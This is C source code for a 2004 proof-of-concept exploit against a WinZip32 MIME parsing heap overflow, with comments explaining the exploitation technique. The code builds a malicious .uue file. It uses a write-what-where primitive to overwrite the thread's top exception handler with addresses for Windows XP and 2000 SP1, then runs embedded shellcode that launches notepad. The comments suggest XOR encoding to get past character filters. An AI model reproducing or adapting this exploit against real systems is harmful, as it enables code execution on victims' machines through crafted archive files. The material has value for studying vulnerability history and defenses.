

/*
 *  Author: snooq       
 *  Date: 14 April 2004  
 *
 *  This is a PoC exploit for WinZip32 MIME Parsing Overflow
 *  bug reported by iDefense on 27 February 2004.
 *
 *  The original advisory is found here:
 *  http://www.idefense.com/application/poi/display?id=76
 *
 *  This version is SP dependent becoz my idiotic shellcode
 *  uses hardcoded addresses.... =p 
 *  
 *  So, test it locally only. Afterall, it's just a PoC rite?
 *  Nonetheless, it's possible to make it more portable by 
 *  using a universal shellcode... 
 *
 *  but beware... chars like <>,.:;'"=[]\/ are filtered...
 *  so feel free to XOR it.. =p
 *
 *  Notes
 *  =====
 *  1) Tested against WinZip 8.1 on WinXP SP1, Win2K SP1 only
 *
 *  2) You need to first launch WinZip before you 'Open'
 *
 *  3) Double clicking the 'uue' won't work 
 *     why so? go figure it out urself... =p 
 *     once u know why... u'd then know how to fix it...
 *
 *  Greetz
 *  ======
 *  # eugene, nam, jf, valmont and the rest..
 *  # sk, shashank + Security_Auditors folks...
 *  # iDefense folks... SiG^2 guys etc...
 *  # lastly.. Greg Hoglund for his 'Cross Page' stuffs... =p
 */

/*
 *  A snapshot of the 'crash'
 *  =========================
 *
 *  Our buffer on the heap looks like this:
 *  
 *  [....AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEEEEEEEEEEEEEEE....]
 *  |--- heap grows this way --------->
 *
 *   
 *  and the CPU is about to execute the following code:
 *
 *  0049BFFC  |> 8B4C13 08      MOV ECX,DWORD PTR DS:[EBX+EDX+8]
 *  0049C000  |. 8B7C13 04      MOV EDI,DWORD PTR DS:[EBX+EDX+4]
 *  0049C004  |. 8979 04        MOV DWORD PTR DS:[ECX+4],EDI
 *  0049C007  |. 8B4C13 04      MOV ECX,DWORD PTR DS:[EBX+EDX+4]
 *  0049C00B  |. 8B7C13 08      MOV EDI,DWORD PTR DS:[EBX+EDX+8]
 *  0049C00F  |. 035D F8        ADD EBX,DWORD PTR SS:[EBP-8]
 *  0049C012  |. 8979 08        MOV DWORD PTR DS:[ECX+8],EDI
 *  0049C015  |. 895D F4        MOV DWORD PTR SS:[EBP-C],EBX
 *
 *  and, EBX register seems to be under our control... =p
 *
 *  EDX = ptr to 'DDDD'	
 *  EBX = 'DDDD' - 1		
 *
 *  By carefully choosing a value for EBX, we are able to manipulate
 *  ECX at 0049BFFC and EDI at 0049C000.
 *
 *  If we set 'DDDD'=0xfffffff5 (-11), 
 *  
 *  -> EBX would be '0xfffffff4' (-12)
 *  -> [EBX+EDX+8] becomes [EDX-4] and ECX = 'CCCC'
 *  -> [EBX+EDX+4] becomes [EDX-8] and EDI = 'BBBB'
 *
 *  Effectively at 0049C004, we can write a DWORD 'BBBB' to ['CCCC'+4]
 *  After that.....
 *
 *  -> [EBX+EDX+4] becomes [EDX-8] and ECX = 'BBBB'
 *  -> [EBX+EDX+8] becomes [EDX-4] and EDI = 'CCCC' 
 *  
 *  Finally we reach MOV DWORD PTR DS:['BBBB'+8],'CCCC' at 0049C012..
 *
 *  Choosing the rite values for 'BBBB' + 'CCCC', execution flow could
 *  be reliably diverted into our shellcode.
 *
 *  In this exploit, I've chosen to install our code as the main thread's
 *  top exception handler so that when exception is triggered at 0049C012,
 *  our code will be called to 'handle' it... =p
 *
 *  This is how I did it but I'm not sure if this is the best way.
 *  If you know of any other better way to exploit this.....
 *  pleaseeeeee tell me....... :)
 *
 */

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#define TARGET	1
#define NOP	0x90

/*
 * Gap for NOPs (not really needed)
 */
#define PAD	0		

/*
 * This 'RANGE' nonsense was useful
 * in locating the 'index', i.e. 'DDDD'
 */
#define RANGE	1*4		

/*
 * Where we control the 'index',
 * i.e EBX register's value
 */
#define IDXOFF	268-RANGE+4 

/*
 * We find our 'where' + 'what' here...
 */
#define OFFSET	IDXOFF-8	

/*
 * -12 bytes from 'index' into where
 * 'where'+'what' are...
 */
#define INDEX	0xfffffff5	 

#define BSIZE	1024
#define FNAME	"snooq.uue"
#define SSIZE	sizeof(shellcode)-1
#define HSIZE	sizeof(header)-1

char buff[BSIZE];
long where, what;

struct {
	char *os;
	long topSEH;
	long jmpADD;
}

targets[] = {
	{
		"Window XP (en) SP1",
		0x7ffddffe,	// Per Thread Top SEH - 2
		0xf27cffff  // [this address + 4] -> shellcode
	},
	{
		"Window 2000 (en) SP1",
		0x7ffddffe,	// Per Thread Top SEH - 2
		0xf354ffff  // [this address + 4] -> shellcode
	},
}, v;

/*
 * Harmless payload that spawns 'notepad.exe'... =p
 */

char shellcode[]=
	"\x55"					// push ebp 
	"\x8b\xec"				// mov ebp, esp
	"\x33\xf6"				// xor esi, esi
	"\x56"					// push esi
	"\x68\x2e\x65\x78\x65"	// push 'exe.'
	"\x68\x65\x70\x61\x64"	// push 'dape'
	"\x68\x90\x6e\x6f\x74"	// push 'ton'
	"\x46"					// inc esi		
	"\x56"					// push esi
	"\x8d\x7d\xf1"			// lea edi, [ebp-0xf]	
	"\x57"					// push edi		
	"\xb8XXXX"				// mov eax, XXXX -> WinExec()  
	"\xff\xd0"				// call eax
	"\x4e"					// dec esi
	"\x56"					// push esi
	"\xb8YYYY"				// mov eax, YYYY -> ExitProcess()  
	"\xff\xd0";				// call eax

char header[]="Content-Type: multipart/mixed; boundary=";

void err_exit(char *s)
{
	printf("%s\n",s);
	exit(0);
}

void filladdr()
{
	char *ptr;
	int i=0, index=INDEX, idxoff=IDXOFF;

	long addr1=(long)WinExec;
	long addr2=(long)ExitProcess;

	printf("-> WinExec() is at: 0x%08x\n",addr1);
	printf("-> ExitProcess() is at: 0x%08x\n",addr2);

	ptr=shellcode;

	while (*ptr!='\0') {
		if (*((long *)ptr)==0x58585858) {
			printf("-> Filling in WinExec at offset: %d\n",(ptr-shellcode));
			*((long *)ptr)=addr1;
		}
		if (*((long *)ptr)==0x59595959) {
			printf("-> Filling in ExitProcess at offset: %d\n",(ptr-shellcode));
			*((long *)ptr)=addr2;
		}
		ptr++;
	}

	ptr=buff+HSIZE+OFFSET;
	printf("-> 'what' == 0x%08x at offset %d\n",what,OFFSET);
	*((long *)ptr)=what;

	ptr+=4;
	printf("-> 'where' == 0x%08x at offset %d\n",where,OFFSET+4);
	*((long *)ptr)=where-4;

	ptr=buff+HSIZE+idxoff;

	for (;i<RANGE;i+=4) {
		printf("-> 'index' == 0x%08x at offset %d\n",index-i,idxoff+i);
		*((long *)(ptr+i))=index-i;
	}

}

void buildfile() 
{
	int i=0;

	FILE *fd;

	if ((fd=fopen(FNAME,"w"))==NULL) {
		err_exit("-> Failed to generate file...");
	}

	for(;i<sizeof(buff);) {
		fprintf(fd,"%c",buff[i++]);
	}

	fclose(fd);

	printf("-> '%s' generated....\n",FNAME);

}

int main(int argc, char *argv[]) 
{
	int i=0, t=TARGET;

	if (argc==2) { t=atoi(argv[1]); }

	where=targets[t-1].topSEH;
	what=targets[t-1].jmpADD;

	printf("\nWinZip32 MIME Parsing Overflow PoC, By Snooq [jinyean@hotmail.com]\n\n");

	memset(buff,NOP,BSIZE);
	printf("-> Generating 'uue' file for target #%d...\n",t);
	memcpy(buff,header,HSIZE);
	filladdr();
	memcpy(buff+HSIZE+IDXOFF+4+PAD,shellcode,SSIZE);
	buildfile();

	return 0;

}



